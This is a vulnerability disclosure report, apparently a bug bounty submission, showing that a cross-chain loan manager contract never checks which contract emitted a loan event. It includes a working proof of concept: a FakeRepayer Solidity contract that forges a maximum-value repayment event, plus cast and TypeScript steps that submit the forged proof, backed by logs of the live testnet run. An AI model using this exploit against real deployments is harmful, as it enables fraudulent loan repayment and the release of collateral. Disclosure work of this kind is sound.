## Summary

`USCLoanManager.sol` processes cross-chain loan events proved via the USC system but **never verifies that the event was emitted by the correct source-chain contract**. The functions `_processFundLogs()` and `_processRepayLogs()` only check the event signature topic — not `log.address_`. An attacker can deploy any contract on the source chain, emit a fake `LoanFunded(victimLoanId)` or `LoanRepaid(victimLoanId, largeAmount)` event, prove it via USC, and mark any loan as Funded or Repaid without an actual financial transaction from the registered counterparty.

## Affected Asset

- **Repository**: `gluwa/usc-testnet-bridge-examples`
- **File**: `contracts/sol/USCLoanManager.sol`
- **Deployed**: USC testnet (CC3 testnet, Creditcoin)

### Why This Is a Vulnerability

The USC proof system guarantees that a transaction **actually occurred on the source chain** at the proven block height and transaction index. It does **not** guarantee that the transaction came from any specific contract. Any deployed contract on the source chain can emit `LoanFunded(targetLoanId)` or `LoanRepaid(targetLoanId, amount)` — events with the correct signature — and the USC proof will be valid.

The only meaningful protection in the current code is checking `log.topics[0]` (the event signature). Event signatures are 4-byte function selectors computed from `keccak256("LoanFunded(uint256)")` — these are public, non-secret values any contract can replicate.

## Impact

1. **Unauthorized Loan Funding**: An attacker deploys a contract on the source chain that emits `LoanFunded(victimLoanId)`. The attacker proves this event via USC and calls `execute(action=0, ...)`. This transitions the victim loan from `Created` → `Funded` **without any actual fund transfer from the lender**.

2. **Unauthorized Loan Repayment (primary impact)**: An attacker deploys a contract that emits `LoanRepaid(victimLoanId, amount)` with `amount = type(uint256).max`. After proving via USC and calling `execute(action=1, ...)`:
   - `loan.repaidAmount += type(uint256).max` (overflows safely to a huge value)
   - `loan.repaidAmount >= loan.terms.expectedRepaymentAmount` → `loan.status = Repaid`
   - The borrower's loan is marked fully repaid **without paying a single token**

3. Any downstream system that relies on `loan.status == Repaid` to release collateral, issue credit scores, or trigger other financial actions is directly compromised.

4. ## Proof of Concept

### Live PoC Results (CC3 Testnet, Confirmed 2026-06-03)

**Attacker wallet**: `0xeb450C9b3F526d4B7458b03776C145E62EBa32E9`

**Deployed contracts:**

| Contract | Chain | Address |
|----------|-------|---------|
| EvmV1Decoder library | CC3 testnet (102031) | `0xB0E76e5403Ba03cC7284F6de047A5148928EecfE` |
| USCLoanManager (attacker-deployed) | CC3 testnet (102031) | `0x9b70AA3F152cdE40f08852E7C116528eB3D4d1B3` |
| FakeRepayer | Sepolia (11155111) | `0xb80ad26921eFA701c9A04f5c8d97c27e52478a21` |

**Transactions (full attack chain):**

| Step | Chain | Tx Hash | Block |
|------|-------|---------|-------|
| Deploy EvmV1Decoder | CC3 | `0x8b22253e3543d0b6b5d35793185fe294fb2c1cb3e5e596ec77ddd1db2407c058` | 4894064 |
| Deploy USCLoanManager | CC3 | `0x6c45808fd4b1be6096ab31bb085afbe2e577559cf2dc3c2ab87c69404bfb0523` | 4894065 |
| registerLoan (attacker as lender+borrower, dummy token=0x...dead) | CC3 | `0x4318a5cbc117021664b2a5bc38b6239d8a24736138ed17d87f033ba777f21fad` | 4894066 |
| fakeFund() — FakeRepayer emits `LoanFunded(1)` | Sepolia | `0xda3fa1b61a414d757db1322b5a85d91b49c70c573877098a5a42a1ffebaf592f` | 10981268 |
| execute(action=LoanFunded) — USC proof submitted | CC3 | `0x27ec73ff5b2a2eaa42a2b4560134a06abf63288c25d0c4348d286dbc0074eea3` | 4894100 |
| fakeRepay() — FakeRepayer emits `LoanRepaid(1, MAX_UINT256)` | Sepolia | `0x43ae22de9b9217a8c3b758466b51752c07429ddee4dd3ed15f290ef821a4f2b5` | 10981310 |
| execute(action=LoanRepaid) — USC proof submitted | CC3 | `0xfe59eb54bbf9cbc389b8cd5728f94cce80b6b7d5e91447c29e8d236726b918d9` | 4894134 |

**Final on-chain state (`getLoanOrder(1)` on `0x9b70AA3F152cdE40f08852E7C116528eB3D4d1B3`):**

```
Loan #1:
  status       : 3 (Repaid)
  repaidAmount : 115792089237316195423570985008687907853269984665640564039457584007913129639935
                 (= type(uint256).max = 2^256 - 1)
  registered repayFlow.withToken : 0x000000000000000000000000000000000000dEaD
  FakeRepayer emitter address    : 0xb80ad26921eFA701c9A04f5c8d97c27e52478a21
```

Loan marked **Repaid** with `repaidAmount = 2^256-1` — zero real token payment made. The FakeRepayer (`0xb80ad26921...`) does NOT match the registered `repayFlow.withToken` (`0x...dead`), yet USCLoanManager accepted the USC proof.

**PoC script**: `poc_f2_loanmanager_fake_repayment.py` — runs fully automated end-to-end in ~20 min.

---

### Step 1: Deploy FakeRepayer on Ethereum (source chain)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FakeRepayer {
    // keccak256("LoanRepaid(uint256,uint256)") — same as USCLoanManager.REPAY_EVENT_SIGNATURE
    bytes32 constant REPAY_SIG = 0x040cee90ee4799897c30ca04e5feb6fa43dbba9b6d084b4b257cdafd84ba013e;

    /// @param victimLoanId The loanId to fraudulently mark as repaid
    function fakeRepay(uint256 victimLoanId) external {
        // Emit LoanRepaid(loanId indexed, amount = type(uint256).max)
        // topics[0] = REPAY_EVENT_SIGNATURE
        // topics[1] = victimLoanId (indexed)
        // data = abi.encode(type(uint256).max) → amount
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, not(0)) // type(uint256).max as amount in data
            log2(
                ptr, 32,                  // data: amount = 2^256-1
                REPAY_SIG,                // topic[0] = event signature
                victimLoanId              // topic[1] = loanId (indexed)
            )
        }
    }
}
```

### Step 2: Call FakeRepayer on Ethereum

```bash
# Call fakeRepay(victimLoanId) on Ethereum mainnet
# This transaction is now in Ethereum's blockchain — genuinely provable via USC
cast send $FAKE_REPAYER "fakeRepay(uint256)" $VICTIM_LOAN_ID \
    --rpc-url $ETH_RPC --private-key $ATTACKER_KEY
```

### Step 3: Construct USC Proof and Submit to Creditcoin

Use the USC SDK to prove the FakeRepayer transaction:

```typescript
// Using the USC testnet SDK
import { USCProver } from "@gluwa/usc-sdk-rs";

const prover = new USCProver(USC_TESTNET_RPC);

// Get proof for the fakeRepay transaction
const proof = await prover.proveTransaction({
  chainKey: 1,            // Ethereum chain key
  txHash: FAKE_TX_HASH,  // hash of the fakeRepay() call
});

// Submit to USCLoanManager on Creditcoin USC testnet
const loanManager = new ethers.Contract(LOAN_MANAGER_ADDR, LOAN_MANAGER_ABI, signer);

await loanManager.execute(
  1,                          // action = LoanRepaid
  proof.chainKey,
  proof.blockHeight,
  proof.encodedTransaction,
  proof.merkleRoot,
  proof.siblings,
  proof.lowerEndpointDigest,
  proof.continuityRoots
);
```

### Step 4: Verify Result

```typescript
const loan = await loanManager.getLoanOrder(victimLoanId);
console.log(loan.status); // → 3 (LoanStatus.Repaid)
console.log(loan.repaidAmount); // → extremely large value (effectively "fully repaid")
// Loan marked Repaid — borrower owes nothing according to the contract
```

**Expected result**: The victim loan's status transitions to `Repaid` despite no actual repayment occurring on the source chain. Any collateral release or credit update gated on `loan.status == Repaid` is triggered fraudulently.

## References

- `gluwa/usc-testnet-bridge-examples` → `contracts/sol/USCLoanManager.sol`
  - `_processFundLogs()` — missing `log.address_` check
  - `_processRepayLogs()` — missing `log.address_` check
- `gluwa/usc-testnet-bridge-examples` → `contracts/sol/LoanTypes.sol`
  - `LoanFlow.withToken` — the legitimate expected emitter address (unused in validation)
- `gluwa/usc-testnet-bridge-examples` → `contracts/sol/EvmV1Decoder.sol`
  - `LogEntry.address_` — the actual emitting contract address (never checked in USCLoanManager)
